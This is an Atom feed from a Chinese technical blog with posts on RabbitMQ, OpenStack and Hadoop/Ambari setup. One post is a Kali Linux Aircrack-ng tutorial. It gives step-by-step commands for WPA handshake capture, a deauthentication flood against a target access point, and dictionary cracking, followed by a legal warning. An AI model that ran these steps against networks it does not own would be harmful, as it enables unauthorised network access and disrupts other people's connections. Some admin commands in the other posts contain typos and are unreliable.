<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L C K</title>
  
  <subtitle>z? kkp gkd</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-03-01T04:08:14.485Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>带棋神 江流儿</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>运维</title>
    <link href="http://yoursite.com/2019/03/01/%E8%BF%90%E7%BB%B4/"/>
    <id>http://yoursite.com/2019/03/01/运维/</id>
    <published>2019-03-01T04:07:54.000Z</published>
    <updated>2019-03-01T04:08:14.485Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Iaas-平台运维"><a href="#Iaas-平台运维" class="headerlink" title="Iaas 平台运维"></a>Iaas 平台运维</h2><h2 id="RABBIT"><a href="#RABBIT" class="headerlink" title="RABBIT"></a>RABBIT</h2><p>每一个RabbitMQ服务器都能创建虚拟消息服务器，我们称之为虚拟主机。每一个vhost本质上是一个mini版的RabbitMQ服务器，拥有自己的交换机、队列、绑定等，拥有自己的权限机制。vhost之于Rabbit就像虚拟机之于物理机一样。他们通过在各个实例间提供逻辑上分离，允许为不同的应用程序安全保密的运行数据，这很有，它既能将同一个Rabbit的众多客户区分开来，又可以避免队列和交换器的命名冲突。RabbitMQ提供了开箱即用的默认的虚拟主机“/”，如果不需要多个vhost可以直接使用这个默认的vhost，通过使用缺省的guest用户名和guest密码来访问默认的vhost。<br><a id="more"></a><br>1.创建虚拟主机  </p><pre><code>rabbitmqctl add_vhost vhostpath                              </code></pre><p>2.删除虚拟主机 </p><pre><code>rabbitmqctl delete_vhost vhostpath                                  </code></pre><p>3.列出所有虚拟主机 </p><pre><code>rabbitmqctl list_vhosts </code></pre><p>4.列出虚拟主机上的所有权限 </p><pre><code>rabbitmqctl list_permissions [-p vhostpath]</code></pre><p>5.删除用户 </p><pre><code>rabbitmqctl delete_user username </code></pre><p>6.修改密码</p><pre><code>rabbitmqctl change_password username newpassword </code></pre><p>7.设置用户权限   [-p vhostpath]  是指设置用户在某个虚拟机上的权限</p><pre><code>rabbitmqctl set_permissions [-p vhostpath] username regexp regexp regexp </code></pre><p>8.清除用户权限</p><pre><code>rabbitmqctl clear_permissions [-p vhostpath] username </code></pre><p>9.列出用户权限 </p><pre><code>rabbitmqctl list_user_permissions username</code></pre><p>10.设置用户角色 tagsName解释</p><pre><code>rabbitmqctl set_user_tags username tagsname</code></pre><p>11.rabbitmqctl创建用户xiandianuser 密码为xiandian</p><pre><code>rabbitmqctl add_user xiandianuser xiandian</code></pre><p>12.创建administrator角色</p><pre><code>rabbitmqctl set_user_tags xiandianuser admin</code></pre><p>13.对xiandianuser授权</p><pre><code>rabbitmqctl set-permissions -p &quot;/&quot; xiandianuser &quot;.*&quot; &quot;.* &quot;.*&quot;</code></pre><p>14.查询rabbit用户</p><pre><code>rabbitmqctl list_users</code></pre><p>15.查看xiandianuser授权信息</p><pre><code>rabbitmqctl set_permissions xiandianuser</code></pre><h2 id="memcached"><a href="#memcached" class="headerlink" title="memcached"></a>memcached</h2><p>一般使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态web应用的速度、提高可扩展性</p><p>2.修改配置文件的方式使memcache的缓存60mb 变256mb 用ps命令查询memcahce的进程信息</p><pre><code>vi /etc/sysconfig/memcached cachesize =&quot;256&quot;ps -ef  grep memcacached</code></pre><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>3.进入keystone mysql </p><pre><code>mysql -ukeystone -p000000use keystone</code></pre><p>  user和local—user做联合跟新 </p><pre><code>update user as u set enabled=0 where id=(select user_id from local_user as lu where name=&quot;neutron&quot;);</code></pre><p>user和local联合查询</p><pre><code>select enabled from user as u where id=（local_user as lu where name=&quot;nova&quot;);</code></pre><p>查询数据库的编码方式</p><pre><code>show variables like &apos;character%&apos;;</code></pre><p>查询时间</p><pre><code>show now（）；</code></pre><h2 id="OPENSTACK-命令"><a href="#OPENSTACK-命令" class="headerlink" title="OPENSTACK 命令"></a>OPENSTACK 命令</h2><p>创建openstack域</p><pre><code>openstack domain create --description &apos;注释&apos; 域名名字</code></pre><p>查询域名</p><pre><code>openstack domain list</code></pre><p>创建openstack项目</p><pre><code>openstack project create --domain 域名 --description &apos;注释&apos;  项目名</code></pre><p>查询项目</p><pre><code>openstack project list</code></pre><p>创建角色</p><pre><code>create role create 角色名</code></pre><p>查询角色</p><pre><code>opnestack role list</code></pre><p>创建openstack用户</p><pre><code>openstack user create --domain 域名 --password 密码 用户名openstack user list</code></pre><p>在域中创建一个用户密码为123456</p><pre><code>openstack user create --domain 域名 --password 123456 用户名</code></pre><p>授权 将用户分配给项目 赐予一个权限 角色代表用户权限分为 admin user</p><pre><code>openstack role add --project 项目 --user 用户名 角色名</code></pre><p>获取token</p><pre><code>openstack token issue </code></pre><p>openstack命令上传image文件</p><pre><code>openstack image create “name” --file image路径 --disk-format qcow2 --container-format bare </code></pre><p>glance命令上传image文件</p><pre><code>glance image-create --name“名字” --disk-format qcow2 --container-format bare --progress &lt;image路径 </code></pre><h2 id="openstack命令创建云主机"><a href="#openstack命令创建云主机" class="headerlink" title="openstack命令创建云主机"></a>openstack命令创建云主机</h2><p>首先要查询到几个关键的信息才能创建云主机<br>分别是网卡.类型.镜像文件.安全组<br>首先查询网卡</p><pre><code>  openstack network list+---------------------------------+----------+----------------------------------------+  ID                                                Name       Subnets                          +---------------------------------+----------+----------------------------------------+  36950291-172c-4daa-                   ext-net    401ce5db-b282-4d14-a040-a05913a    86c0-e0802490e50b                                      f8b04                              c37b3a2b-c7c4-4682-a64b-           int-netl   6aaafac7-e6d2-46f4-9b27-4bb0a20    e6d9c8c8a9a8                                               0edf7                            +---------------------------------+----------+----------------------------------------+</code></pre><p>我们要获取的是网卡的ID</p><p>在查询类型</p><pre><code>  openstack flavor list+----+-----------+-------+------+-----------+-------+-----------+  ID   Name          RAM   Disk   Ephemeral   VCPUs   Is Public  +----+-----------+-------+------+-----------+-------+-----------+  1    m1.tiny       512      1           0       1   True         2    m1.small     2048     20           0       1   True         3    m1.medium    4096     40           0       2   True         4    m1.large     8192     80           0       4   True         5    m1.xlarge   16384    160           0       8   True       +----+-----------+-------+------+-----------+-------+-----------+</code></pre><p> 类型就是云主机的内存，磁盘 和vcpus 之后选择相对应的名字下文选的m1.small</p><p>查询镜像文件</p><pre><code>  openstack image list+--------------------------------------+--------------+--------+  ID                                     Name           Status  +--------------------------------------+--------------+--------+  daaeb6b4-ec16-4e6f-a79a-c701fc64e8ed   centos7        active    1b30658f-bed3-4ecf-a28f-6bbc7f5c2460   test1          active    f487abd0-cf79-4913-aa63-d5416a42a236   cirros-0.3.5   active  +--------------------------------------+--------------+--------+</code></pre><p>可以选择image的名字也可以选择id</p><p>查询安全组</p><pre><code>  openstack security group list+----------------------+---------+----------------------+------------------------+  ID                                  Name      Description            Project               +----------------------+---------+----------------------+------------------------+  78281d54-8c0a-416c-    default   Default security       b6cf94fe31c34b339e4e    be6f-85c1d23b2356                       group                    e867977cdb14              +----------------------+---------+----------------------+-------------------------+</code></pre><p>选择安全组的名字</p><p>接下来就是创建云主机</p><pre><code>openstack server create --image </code></pre><p>镜像名字 –flavor mi.samll –nic net-id=网卡id 云主机名字</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Iaas-平台运维&quot;&gt;&lt;a href=&quot;#Iaas-平台运维&quot; class=&quot;headerlink&quot; title=&quot;Iaas 平台运维&quot;&gt;&lt;/a&gt;Iaas 平台运维&lt;/h2&gt;&lt;h2 id=&quot;RABBIT&quot;&gt;&lt;a href=&quot;#RABBIT&quot; class=&quot;headerlink&quot; title=&quot;RABBIT&quot;&gt;&lt;/a&gt;RABBIT&lt;/h2&gt;&lt;p&gt;每一个RabbitMQ服务器都能创建虚拟消息服务器，我们称之为虚拟主机。每一个vhost本质上是一个mini版的RabbitMQ服务器，拥有自己的交换机、队列、绑定等，拥有自己的权限机制。vhost之于Rabbit就像虚拟机之于物理机一样。他们通过在各个实例间提供逻辑上分离，允许为不同的应用程序安全保密的运行数据，这很有，它既能将同一个Rabbit的众多客户区分开来，又可以避免队列和交换器的命名冲突。RabbitMQ提供了开箱即用的默认的虚拟主机“/”，如果不需要多个vhost可以直接使用这个默认的vhost，通过使用缺省的guest用户名和guest密码来访问默认的vhost。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>大数据平台搭建</title>
    <link href="http://yoursite.com/2019/01/19/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/01/19/大数据平台搭建/</id>
    <published>2019-01-19T08:48:05.000Z</published>
    <updated>2019-01-19T09:34:15.562Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="大数据平台搭建"><a href="#大数据平台搭建" class="headerlink" title=" 大数据平台搭建"></a> 大数据平台搭建</h2><h2 id="1-大数据简介"><a href="#1-大数据简介" class="headerlink" title="1.大数据简介"></a>1.大数据简介</h2><p>“大数据”是一个体量特别大，数据类别特别庞杂的数据集合，并且这样的数据集无法用传统数据库工具或常规软件工具抓取、管理和处理其内容。大数据技术是指从各种各样类型的庞杂数据中，快速的获取有价值的信息的能力。适用于大数据的技术包括大规模并行处理数据库，数据挖掘电网，分布式文件系统，分布式数据库，云计算平台和可扩展的存储系统。<br>Apache的Hadoop项目是可靠的、可扩展的、开源的、分布式计算软件。Apache的Hadoop软件库是允许通过相对简单的程序模型构建计算集群为庞大的数据集进行分布式计算的框架。<br>Hadoop的设计思想可以将计算模式从单节点服务器扩展为数以千计的计算集群，每一个单独的服务器都提供自主的本地计算及存储能力。<br>对于高可用指标而言，Hadoop软件库自身可以通过检测和故障调试从应用层来实现高可用而不需要关心硬件底层的高可用性。所以提供一个计算集群上层的高可用服务对于集群故障修复而言就显得至关重要。</p><h2 id="2。基本环境配置"><a href="#2。基本环境配置" class="headerlink" title="2。基本环境配置"></a>2。基本环境配置</h2><p>以两台节点为例来组件Hadoop分布式集群，这里采用的系统版本为Centos7，如下表所示：  </p><pre><code>主机名    内存    硬盘    IP地址        角色master    8192MB    100G    192.168.200.131    Ambari-Server                    Ambari-Agentslave1    4096MB    100G    192.168.200.133    Ambari-Agent</code></pre><h2 id="3-配置主机名"><a href="#3-配置主机名" class="headerlink" title="3.配置主机名"></a>3.配置主机名</h2><p>master</p><pre><code>hostnamectl set-hostname master hostname master</code></pre><p>slave1</p><pre><code>hostnamectl set-hostname slave1hostname slave1</code></pre><h2 id="4-修改hosts文件"><a href="#4-修改hosts文件" class="headerlink" title="4.修改hosts文件"></a>4.修改hosts文件</h2><p> master </p><pre><code> vi /etc/hosts192.168.200.131 master.hadoop master192.168.200.133 slave1.hadoop</code></pre><p> slave1</p><pre><code> vi /etc/hosts192.168.200.131 master.hadoop192.168.200.133 slave1.hadoop slave1</code></pre><h2 id="5-修改yum源"><a href="#5-修改yum源" class="headerlink" title="5.修改yum源"></a>5.修改yum源</h2><p>和iaas平台一样有2个节点所以方法也和iaas平台搭建修改yum的方式一样<br>一台镜像挂载 一台ftp连接</p><pre><code>cd /optmkdir centos ambari</code></pre><h2 id="6-禁用Transparent-Huge-Pages"><a href="#6-禁用Transparent-Huge-Pages" class="headerlink" title="6.禁用Transparent Huge Pages"></a>6.禁用Transparent Huge Pages</h2><p>操作系统后台有一个叫做khugepaged的进程，它会一直扫描所有进程占用的内存，在可能的情况下会把4kpage交换为Huge Pages，在这个过程中，对于操作的内存的各种分配活动都需要各种内存锁，直接影响程序的内存访问性能，并且，这个过程对于应用是透明的，在应用层面不可控制,对于专门为4k page优化的程序来说，可能会造成随机的性能下降现象。</p><p> master &amp; slave1<br>直接重定向修改配置文件</p><pre><code>echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledecho never &gt; /sys/kernel/mm/transparent_hugepage/defrag</code></pre><p>重启后失效，需要再次执行</p><h2 id="7-安装配置JDK"><a href="#7-安装配置JDK" class="headerlink" title="7.安装配置JDK"></a>7.安装配置JDK</h2><p>先在master节点上按装jdk</p><pre><code>mkdir /usr/jdk64/</code></pre><p>进入到挂载大数据镜像的文件夹<br>找到 jdk压缩包 </p><pre><code>cd /opt/ambari</code></pre><p>解压到/usr/jdk64/</p><pre><code>tar -zxvf jdk-8u77-linux-x64.tar.gz -C /usr/jdk64/</code></pre><p>进入配置文件</p><pre><code>vi /etc/profile</code></pre><p>修改java环境变量</p><pre><code>export JAVA_HOME=/usr/jdk64/jdk1.8.0_77export PATH=$JAVA_HOME/bin:$PATH</code></pre><p>获取一下环境使其生效</p><pre><code>source /etc/profile</code></pre><p>查看已安装的java版本 如果没有显示说明环境变量修改问题</p><pre><code>java –version</code></pre><p>然后在slave1节点上安装jdk</p><p>将maser上的jdk压缩包传输到slave1节点上</p><pre><code>scp /opt/usr/jdk64/jdk-8u77-linux-x64.tar.gz 192.168.200.133：/opt/usr/jdk64/</code></pre><p>然后解压<br>修改环境变量<br>获取配置文件<br>查看版本</p><h2 id="8-配置ambari-server"><a href="#8-配置ambari-server" class="headerlink" title="8.配置ambari-server"></a>8.配置ambari-server</h2><p>ambari-server只装在master上</p><p>使用yum源安装</p><pre><code>yum -y install  ambari-server</code></pre><p>启动服务并且设置开机自启</p><pre><code>systemctl enable mariadbsystemctl start mariadb</code></pre><h2 id="9-安装MariaDB数据库"><a href="#9-安装MariaDB数据库" class="headerlink" title="9.安装MariaDB数据库"></a>9.安装MariaDB数据库</h2><p>MariaDB数据库全部步骤中最关键最核心的一部分<br>配置在master上</p><p>使用数据库安全配置向导为数据库设置密码</p><pre><code>mysql_secure_installation</code></pre><p>按enter确认后设置数据库root密码，我们这里设置为“bigdata”<br>以下是向导过程</p><pre><code>Remove anonymous users? [Y/n] yRemove anonymous users? [Y/n] yDisallow root login remotely? [Y/n] nRemove test database and access to it? [Y/n] yReload privilege tables now? [Y/n] y</code></pre><p>配置完成后使用root用户进如创建ambari数据库</p><pre><code>mysql -uroot -pbigdata</code></pre><p>数据库内部命令</p><p>10.创建ambari;数据库</p><pre><code>MariaDB [(none)]&gt; create database ambari;</code></pre><p>grant命令给予本地用户和全部ip权限</p><pre><code>MariaDB [(none)]&gt; grant all privileges on ambari.* to &apos;ambari&apos;@&apos;localhost&apos; identified by &apos;bigdata&apos;;MariaDB [(none)]&gt; grant all privileges on ambari.* to &apos;ambari&apos;@&apos;%&apos; identified by &apos;bigdata&apos;;</code></pre><p>进入ambari数据库</p><pre><code>MariaDB [(none)]&gt; use ambari;</code></pre><p>获取一下ambari-server下面的sql文件</p><pre><code>MariaDB [ambari]&gt; source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</code></pre><p>完成退出</p><pre><code>MariaDB [ambari]&gt; quit</code></pre><h2 id="11-安装配置ambari-server"><a href="#11-安装配置ambari-server" class="headerlink" title="11.安装配置ambari-server"></a>11.安装配置ambari-server</h2><p>配置在master上<br>进入配置文件</p><pre><code>vi /etc/profile</code></pre><p>在文件中添加一条命令</p><pre><code>export buildNumber=2.6.0.0</code></pre><p>启动ambari-setup安装向导</p><pre><code>ambari-server setup</code></pre><p>一下向导过程</p><pre><code>WARNING: SELinux is set to &apos;permissive&apos; mode and temporarily disabled.OK to continue [y/n] (y)? Customize user account for ambari-server daemon [y/n] (n)? nChecking JDK...[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7[3] Custom JDK==============================================================================Enter choice (1): 3Path to JAVA_HOME: /usr/jdk64/jdk1.8.0_77Validating JDK on Ambari Server...done.Completing setup...Configuring database... Enter advanced database configuration [y/n] (n)? yConfiguring database...====================================================================Choose one of the following options:[1] - PostgreSQL (Embedded)[2] - Oracle[3] - MySQL[4] - PostgreSQL[5] - Microsoft SQL Server (Tech Preview)[6] - SQL Anywhere</code></pre><p>====================================================================<br>    Enter choice (1): 3<br>    Hostname (localhost):<br>    Port (3306):<br>    Database name (ambari):<br>    Username (ambari):<br>    Enter Database Password (bigdata):<br>    Proceed with configuring remote database connection properties [y/n] (y)?<br>    Ambari Server ‘setup’ completed successfully.</p><p>键入mysql连接驱动</p><pre><code>ambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar</code></pre><p>启动ambari-server服务</p><pre><code>mbari-server start</code></pre><h2 id="12配置ambari-agent"><a href="#12配置ambari-agent" class="headerlink" title="12配置ambari-agent"></a>12配置ambari-agent</h2><p>maser slave1 都要安装</p><p>yum安装</p><pre><code>yum -y install ambari-agent</code></pre><p>进入配置文件</p><pre><code>vi /etc/ambari-agent/conf/ambari-agent.ini、</code></pre><p>修改hosname为master 2台都一样</p><pre><code>hostname= master.hadoop</code></pre><p>服务重启</p><pre><code>ambari-agent restart</code></pre><p>使用tail命令监视一下ambari-agent.log 日志结尾更新</p><pre><code>tail -f /var/log/ambari-agent/ambari-agent.log</code></pre><p>2台主机都能获取成功平台也就成功搭建完成</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kali Linux  Aircrack-ng wifi 攻击 </title>
    <link href="http://yoursite.com/2019/01/12/kali-Linux-Aircrack-ng-wifi-%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/01/12/kali-Linux-Aircrack-ng-wifi-攻击/</id>
    <published>2019-01-12T08:42:40.000Z</published>
    <updated>2019-01-15T11:32:43.179Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Aircrack是一套用于破解WEP和WPA的工具套装，一般用于无线网络的密钥破解，从而非法进入未经许可的无线网络。</p><h2 id="1-进去kali系统连接终端"><a href="#1-进去kali系统连接终端" class="headerlink" title="1.进去kali系统连接终端"></a>1.进去kali系统连接终端</h2><p>KILL 掉影响网卡的进程 命令为</p><pre><code>airmon-ng check kill</code></pre><h2 id="2-开启网卡"><a href="#2-开启网卡" class="headerlink" title="2 开启网卡"></a>2 开启网卡</h2><pre><code>airmon-ng start wlan0</code></pre><p>这个时候你的网卡名由wlan0变成wlan0mon mon的意思是监控</p><h2 id="3-进行wifi网络嗅探，查看当前区域内的wifi的属性-命令为："><a href="#3-进行wifi网络嗅探，查看当前区域内的wifi的属性-命令为：" class="headerlink" title="3 进行wifi网络嗅探，查看当前区域内的wifi的属性 命令为："></a>3 进行wifi网络嗅探，查看当前区域内的wifi的属性 命令为：</h2><pre><code>airodump-ng wlan0mon</code></pre><h2 id="4-显示当前区域的WiFi的信息后-需要明白几个信息"><a href="#4-显示当前区域的WiFi的信息后-需要明白几个信息" class="headerlink" title="4 显示当前区域的WiFi的信息后 需要明白几个信息"></a>4 显示当前区域的WiFi的信息后 需要明白几个信息</h2><pre><code>BSSID：wifi的Mac地址，Data wifi数据大小CH ：渠道ESSID：wifi名称 强度降序排列</code></pre><h2 id="5-进行对目标wifi进行抓取握手包"><a href="#5-进行对目标wifi进行抓取握手包" class="headerlink" title="5 进行对目标wifi进行抓取握手包"></a>5 进行对目标wifi进行抓取握手包</h2><pre><code>airodump-ng -c 1 --bssid 30:24:32:6F:A7:16  -w ~/Desktop/bao/aa  wlan0mon</code></pre><p> -c 为渠道   –bssid为mac地址  -w ~/Desktop/bao/aa 是方包的目录  aa是包名（自定义）</p><h2 id="6-对目标wifi进行洪水攻击，新建一个终端窗口输入："><a href="#6-对目标wifi进行洪水攻击，新建一个终端窗口输入：" class="headerlink" title="6.对目标wifi进行洪水攻击，新建一个终端窗口输入："></a>6.对目标wifi进行洪水攻击，新建一个终端窗口输入：</h2><pre><code>aireplay-ng -0 0 -a 30:24:32:6F:A7:16  wlam0mon</code></pre><p>次攻击会让目标wifi所有连接断开</p><h2 id="7-回到上一个正在抓包的窗口入出现WPA-handshake-表明只有有人重新连接wifi就可以抓到握手包"><a href="#7-回到上一个正在抓包的窗口入出现WPA-handshake-表明只有有人重新连接wifi就可以抓到握手包" class="headerlink" title="7 回到上一个正在抓包的窗口入出现WPA handshake 表明只有有人重新连接wifi就可以抓到握手包"></a>7 回到上一个正在抓包的窗口入出现WPA handshake 表明只有有人重新连接wifi就可以抓到握手包</h2><p>假设目标有人重新连接成功抓取握手包，那么我们就可以进行密码破解<br>密码破解我们需要字典 字典可以去百度上下载 也可以用kali自带的 命令如下：</p><pre><code>aircrack-ng -w ~/Desktop/passwd/zidian.txt ~/Desktop/cap/aa-01.cap</code></pre><p>接下来就是耐心等待 可能会失败 成功会显示 key found！{xxxxxx}<br>成功后你可能会成为板房客</p><h2 id="8-要明白的事情"><a href="#8-要明白的事情" class="headerlink" title="8.要明白的事情"></a>8.要明白的事情</h2><p>破解他人WIFI属于违法行为，涉嫌盗窃，情节严重的，有可能被追究刑事责任；<br>如果单纯的盗用信号，构成民法上的不当得利，触犯了《民法通则；如果通过路由器侵入他人系统<br>，严重的构成犯罪，如非法侵入计算机系统罪，触犯《刑法》，这是要负刑事责任的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>iaas搭建</title>
    <link href="http://yoursite.com/2019/01/10/iaas%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2019/01/10/iaas搭建/</id>
    <published>2019-01-10T10:19:34.000Z</published>
    <updated>2019-03-01T04:37:09.828Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>IAAS平台搭建</p><a id="more"></a><h2 id="准备步骤和网卡要求"><a href="#准备步骤和网卡要求" class="headerlink" title="准备步骤和网卡要求"></a>准备步骤和网卡要求</h2><p>1.创建2台虚拟机分别叫做controller compute<br>controller 为控制节点<br>compute为计算节点</p><p>controller 和compute都需要2张网卡<br>一张网卡连接内网一张连接外网</p><p>contronller网卡1 192.168.100.10  网卡2 192.168.200.10</p><p>compute网卡2 192.168.100.20  网卡2 192.168.200.20</p><h2 id="controller-yum源配置"><a href="#controller-yum源配置" class="headerlink" title="controller yum源配置"></a>controller yum源配置</h2><p>进入controller终端</p><pre><code>cd /optmkdir iaas centos7  rm -rf /etc/yum.repos.d/*            vi　/etc/yum.repos.d/yum.repo    </code></pre><p>配置yum.repo</p><pre><code>[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[iaas]name=iaasbaseurl=file:///opt/iaas-repogpgcheck=0enabled=1</code></pre><p>挂载光盘</p><pre><code>mount -o loop /dev/sr0 /opt/centosmount -o loop /dev/sr1 /opt/iaas</code></pre><p>关闭防火墙</p><pre><code>setenforce   0    systemctl stop firewalldsystemctl disable firewalld</code></pre><h2 id="ftp配置"><a href="#ftp配置" class="headerlink" title="ftp配置"></a>ftp配置</h2><p>控制节点yum list 成功后 装ftp<br>装完ftp 后</p><pre><code>vi  /etc/vsftp/vsftpd.conf</code></pre><p>在最后一行添加</p><pre><code>anon_root=/optservice vsftpd restart chkconfig vsftpd on</code></pre><h2 id="openrc-sh配置"><a href="#openrc-sh配置" class="headerlink" title="openrc.sh配置"></a>openrc.sh配置</h2><p>安装xiandian</p><pre><code>yum install -y iaas-xiandian</code></pre><p>进入openrc.sh</p><pre><code> vi /etc/xiandian/openrc.sh##--------------------system config--------------------####Controller Server Manager IP. example:x.x.x.xHOST_IP=192.168.100.10##Controller Server hostname. example:controllerHOST_NAME=controller##Compute Node Manager IP. example:x.x.x.xHOST_IP_NODE=192.168.100.20##Compute Node hostname. example:computeHOST_NAME_NODE=compute##--------------------Rabbit config ------------------####user for rabbit. example:openstackRABBIT_USER=openstack##Password for rabbit user .example:000000RABBIT_PASS=000000##--------------------MySQL config---------------------####Password for MySQL root user . exmaple:000000DB_PASS=000000##--------------------Keystone config------------------####Password for Keystore admin user. exmaple:000000DOMAIN_NAME=adminADMIN_PASS=000000DEMO_PASS=000000##Password for Mysql keystore user. exmaple:000000KEYSTONE_DBPASS=000000##--------------------Glance config--------------------####Password for Mysql glance user. exmaple:000000GLANCE_DBPASS=000000##Password for Keystore glance user. exmaple:000000GLANCE_PASS=000000##--------------------Nova config----------------------####Password for Mysql nova user. exmaple:000000NOVA_DBPASS=000000##Password for Keystore nova user. exmaple:000000NOVA_PASS=000000##--------------------Neturon config-------------------####Password for Mysql neutron user. exmaple:000000NEUTRON_DBPASS=000000##Password for Keystore neutron user. exmaple:000000NEUTRON_PASS=000000##metadata secret for neutron. exmaple:000000METADATA_SECRET=000000##External Network Interface. example:eth1INTERFACE_NAME=enp0s8##First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101##minvlan=101##Last Vlan ID in VLAN RANGE for VLAN Network. example:200##maxvlan=200##--------------------Cinder config--------------------####Password for Mysql cinder user. exmaple:000000CINDER_DBPASS=000000##Password for Keystore cinder user. exmaple:000000CINDER_PASS=000000##Cinder Block Disk. example:md126p3BLOCK_DISK=sdc1##--------------------Swift config---------------------####Password for Keystore swift user. exmaple:000000SWIFT_PASS=000000##The NO1. NODE Object Disk for Swift. example:md126p4. The 2nd will be OBJECT_DISK_2OBJECT_DISK=sdb1##The NO1. NODE IP for Swift Storage Network. example:x.x.x.x. The 2nd will be STORAGE_LOCAL_NET_IP_2STORAGE_LOCAL_NET_IP=192.168.100.10##--------------------Heat config----------------------####Password for Mysql heat user. exmaple:000000HEAT_DBPASS=000000##Password for Keystore heat user. exmaple:000000HEAT_PASS=000000##--------------------Ceilometer config----------------####Password for Mysql ceilometer user. exmaple:000000CEILOMETER_DBPASS=000000##Password for Keystore ceilometer user. exmaple:000000CEILOMETER_PASS=000000##--------------------AODH config----------------####Password for Mysql AODH user. exmaple:000000AODH_DBPASS=000000##Password for Keystore AODH user. exmaple:000000AODH_PASS=000000</code></pre><p>以上是更改之后的配置文件</p><p>将次文件用scp命令发给compute节点</p><pre><code>scp /etc/xiandian/o** root@compute:/etc/xiandian</code></pre><h2 id="controller节点服务的安装"><a href="#controller节点服务的安装" class="headerlink" title="controller节点服务的安装"></a>controller节点服务的安装</h2><p>然后进行安装脚本</p><pre><code>iaas-pre-host.sh     </code></pre><p>然后重启</p><pre><code>reboot</code></pre><p>重启完成后安装mysql keystone glance nova neutron<br>安装mysql</p><pre><code>iaas-install-mysql.sh</code></pre><p>安装keystone</p><pre><code>iaas-install-keystone.sh</code></pre><p>安装完成后获取一下</p><pre><code>source /etc/keystone/admin-openrc.sh </code></pre><p>安装glance</p><pre><code>iaas-install-glance.sh</code></pre><p>安装nova</p><pre><code>iaas-install-nova-controller.sh    </code></pre><p>安装neutron</p><pre><code>iaas-install-neutron-controller.sh</code></pre><p>安装neutron gre</p><pre><code>iaas-install-neutron-controller-gre.sh</code></pre><p>最后安装</p><pre><code>iaas-install-dashboard.sh</code></pre><p>到这里controller节点配置全部完成<br>接下来是compute节点配置</p><h2 id="compute-yum源配置"><a href="#compute-yum源配置" class="headerlink" title="compute yum源配置"></a>compute yum源配置</h2><p>直接修改yum源为用ftp连接controller的yum源</p><pre><code>rm -rf /etc/yum.repos.d/*        vi　/etc/yum.repos.d/yum.repo    </code></pre><p>配置文件如下</p><pre><code>[centos]name=centosbaseurl=ftp://192.168.10.10/centos/gpgcheck=0enabled=1[iaas]name=iaasbaseurl=ftp://192.168.10.10/iaas-repo/gpgcheck=0enabled=1</code></pre><h2 id="compute-服务安装"><a href="#compute-服务安装" class="headerlink" title="compute 服务安装"></a>compute 服务安装</h2><p>yum list能列出后安装xiandian</p><pre><code>yum install-y iaas-xiandian</code></pre><p>安装iaas脚本</p><pre><code>iaas-pre-host.sh</code></pre><p>重启<br>    root</p><p>之后安装nova 和neutron</p><pre><code>iaas-install-nova-compute.sh iaas-install-neutron-compute.sh iaas-install-neutron-compute-gre.sh</code></pre><h2 id="完成之后"><a href="#完成之后" class="headerlink" title="完成之后"></a>完成之后</h2><p>云平台搭建就完成了<br>保证自己主机p和云平台内网互通<br>在ie浏览器输入<br>192.168.100.10/dashboard<br>接下来就是页面操作了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IAAS平台搭建&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
